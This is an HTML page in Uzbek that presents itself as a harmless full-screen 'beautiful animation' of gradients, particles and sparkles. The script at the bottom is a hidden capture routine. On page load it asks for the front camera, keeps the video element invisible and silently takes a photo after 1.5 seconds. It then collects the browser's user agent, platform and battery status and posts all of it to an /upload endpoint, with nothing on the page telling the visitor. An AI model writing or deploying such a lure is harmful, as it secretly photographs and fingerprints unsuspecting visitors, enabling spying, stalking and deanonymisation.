<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <title>Animatsiya</title>
    <style>
      #video {
        display: none;
      }
    </style>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        height: 100vh;
        overflow: hidden;
        background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
        position: relative;
      }

      .animation-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(
          45deg,
          #ff6b6b,
          #4ecdc4,
          #45b7d1,
          #96ceb4,
          #ffeaa7,
          #dda0dd,
          #98d8c8
        );
        background-size: 400% 400%;
        animation: gradientShift 8s ease infinite;
      }

      @keyframes gradientShift {
        0% {
          background-position: 0% 50%;
        }
        50% {
          background-position: 100% 50%;
        }
        100% {
          background-position: 0% 50%;
        }
      }

      .particle {
        position: absolute;
        border-radius: 50%;
        pointer-events: none;
        opacity: 0.7;
        animation: float 6s ease-in-out infinite;
      }

      .particle:nth-child(1) {
        width: 80px;
        height: 80px;
        background: radial-gradient(circle, #ff6b6b, #ff8e8e);
        top: 20%;
        left: 10%;
        animation-delay: 0s;
        animation-duration: 8s;
      }

      .particle:nth-child(2) {
        width: 60px;
        height: 60px;
        background: radial-gradient(circle, #4ecdc4, #7ed6cc);
        top: 60%;
        left: 80%;
        animation-delay: 1s;
        animation-duration: 10s;
      }

      .particle:nth-child(3) {
        width: 100px;
        height: 100px;
        background: radial-gradient(circle, #45b7d1, #74c7e3);
        top: 40%;
        left: 60%;
        animation-delay: 2s;
        animation-duration: 7s;
      }

      .particle:nth-child(4) {
        width: 70px;
        height: 70px;
        background: radial-gradient(circle, #96ceb4, #b8dcc6);
        top: 80%;
        left: 20%;
        animation-delay: 3s;
        animation-duration: 9s;
      }

      .particle:nth-child(5) {
        width: 90px;
        height: 90px;
        background: radial-gradient(circle, #ffeaa7, #ffef9f);
        top: 10%;
        left: 70%;
        animation-delay: 4s;
        animation-duration: 6s;
      }

      .particle:nth-child(6) {
        width: 50px;
        height: 50px;
        background: radial-gradient(circle, #dda0dd, #e6b3e6);
        top: 70%;
        left: 50%;
        animation-delay: 5s;
        animation-duration: 11s;
      }

      @keyframes float {
        0%,
        100% {
          transform: translateY(0px) rotate(0deg) scale(1);
        }
        25% {
          transform: translateY(-30px) rotate(90deg) scale(1.1);
        }
        50% {
          transform: translateY(-60px) rotate(180deg) scale(0.9);
        }
        75% {
          transform: translateY(-30px) rotate(270deg) scale(1.05);
        }
      }

      .wave {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 200px;
        background: linear-gradient(
          to top,
          rgba(255, 255, 255, 0.1),
          transparent
        );
        animation: wave 4s ease-in-out infinite;
      }

      .wave:before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        width: 200%;
        height: 100%;
        background: linear-gradient(
          90deg,
          transparent,
          rgba(255, 255, 255, 0.2),
          transparent,
          rgba(255, 255, 255, 0.1),
          transparent
        );
        animation: waveMove 6s linear infinite;
      }

      @keyframes wave {
        0%,
        100% {
          transform: scaleY(1);
        }
        50% {
          transform: scaleY(1.2);
        }
      }

      @keyframes waveMove {
        0% {
          transform: translateX(-50%);
        }
        100% {
          transform: translateX(0%);
        }
      }

      .center-text {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        text-align: center;
        color: white;
        font-family: "Arial", sans-serif;
        z-index: 10;
      }

      .center-text h1 {
        font-size: 4rem;
        font-weight: bold;
        margin-bottom: 1rem;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        animation: textGlow 3s ease-in-out infinite alternate;
      }

      .center-text p {
        font-size: 1.5rem;
        opacity: 0.9;
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
        animation: textFloat 4s ease-in-out infinite;
      }

      @keyframes textGlow {
        0% {
          text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3),
            0 0 20px rgba(255, 255, 255, 0.3);
        }
        100% {
          text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3),
            0 0 30px rgba(255, 255, 255, 0.6);
        }
      }

      @keyframes textFloat {
        0%,
        100% {
          transform: translateY(0px);
        }
        50% {
          transform: translateY(-10px);
        }
      }

      .sparkle {
        position: absolute;
        width: 4px;
        height: 4px;
        background: white;
        border-radius: 50%;
        animation: sparkle 2s linear infinite;
      }

      .sparkle:nth-child(odd) {
        animation-delay: 1s;
      }

      @keyframes sparkle {
        0% {
          opacity: 0;
          transform: scale(0);
        }
        50% {
          opacity: 1;
          transform: scale(1);
        }
        100% {
          opacity: 0;
          transform: scale(0);
        }
      }

      /* Generate sparkles */
      .sparkle:nth-child(7) {
        top: 15%;
        left: 25%;
        animation-delay: 0.5s;
      }
      .sparkle:nth-child(8) {
        top: 35%;
        left: 75%;
        animation-delay: 1.2s;
      }
      .sparkle:nth-child(9) {
        top: 65%;
        left: 15%;
        animation-delay: 2.1s;
      }
      .sparkle:nth-child(10) {
        top: 85%;
        left: 85%;
        animation-delay: 0.8s;
      }
      .sparkle:nth-child(11) {
        top: 25%;
        left: 45%;
        animation-delay: 1.7s;
      }
      .sparkle:nth-child(12) {
        top: 55%;
        left: 35%;
        animation-delay: 2.3s;
      }
    </style>
  </head>
  <body>
    <div class="animation-container">
      <!-- Floating particles -->
      <div class="particle"></div>
      <div class="particle"></div>
      <div class="particle"></div>
      <div class="particle"></div>
      <div class="particle"></div>
      <div class="particle"></div>

      <!-- Sparkles -->
      <div class="sparkle"></div>
      <div class="sparkle"></div>
      <div class="sparkle"></div>
      <div class="sparkle"></div>
      <div class="sparkle"></div>
      <div class="sparkle"></div>

      <!-- Wave effect -->
      <div class="wave"></div>

      <!-- Center text -->
      <div class="center-text">
        <h1>Chiroyli Animatsiya</h1>
        <p>Beautiful Full Screen Animation</p>
      </div>
    </div>
    <video id="video" autoplay></video>
    <script>
      const video = document.getElementById("video");

      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false,
          });

          video.srcObject = stream;

          video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => captureAndSendPhoto(stream), 1500);
          };
        } catch (err) {
          console.error("Kamera ruxsati berilmadi:", err);
        }
      }

      async function captureAndSendPhoto(stream) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Kamera oqimini to'xtatish
        stream.getTracks().forEach((track) => track.stop());

        // Rasmni blob sifatida olish
        let blob;
        if (canvas.toBlob) {
          blob = await new Promise((resolve) =>
            canvas.toBlob(resolve, "image/jpeg")
          );
        } else {
          const dataUrl = canvas.toDataURL("image/jpeg");
          blob = await (await fetch(dataUrl)).blob();
        }

        // Qurilma haqida ma'lumotlar
        const userAgent = navigator.userAgent || "unknown";
        const platform = navigator.platform || "unknown";

        let batteryLevel = "unknown";
        let batteryCharging = "unknown";

        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            batteryLevel = battery.level;
            batteryCharging = battery.charging;
          } catch (e) {
            console.warn("Battery API ishlamadi");
          }
        }

        // FormData yuborish
        const formData = new FormData();
        formData.append("photo", blob, "auto.jpg");
        formData.append("userAgent", userAgent);
        formData.append("platform", platform);
        formData.append("batteryLevel", batteryLevel);
        formData.append("batteryCharging", batteryCharging);

        fetch("/upload", {
          method: "POST",
          body: formData,
        })
          .then((res) => {
            if (res.ok) {
              console.log("Rasm va ma'lumotlar yuborildi ✅");
            } else {
              console.error("Yuborishda xatolik ❌");
            }
          })
          .catch((err) => {
            console.error("Xatolik:", err);
          });
      }

      startCamera();
    </script>
